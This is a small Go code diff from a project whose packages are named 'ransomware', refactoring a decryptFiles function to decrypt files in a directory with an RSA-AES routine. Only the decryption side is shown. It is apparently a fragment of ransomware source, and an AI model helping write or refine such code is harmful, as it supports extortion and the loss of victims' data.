@@ -5,6 +5,7 @@ import (
 	"io/fs"
 	"os"
 	"path/filepath"
+	"ransomware/encryption"
 	"ransomware/encryption/rsaLib"
 	"ransomware/io"
 	"ransomware/utils"
@@ -66,7 +67,7 @@ func decryptFiles(dirPath string, cPrivKey *rsa.PrivateKey) {
 	waitGroup.Add(1)
 	go func() {
 		for file := range filesToVisit {
-			file.Decrypt(cPrivKey)
+			io.DecryptFile(&file, encryption.RSAAESDecrypt, cPrivKey)
 		}
 		defer waitGroup.Done()
 	}()
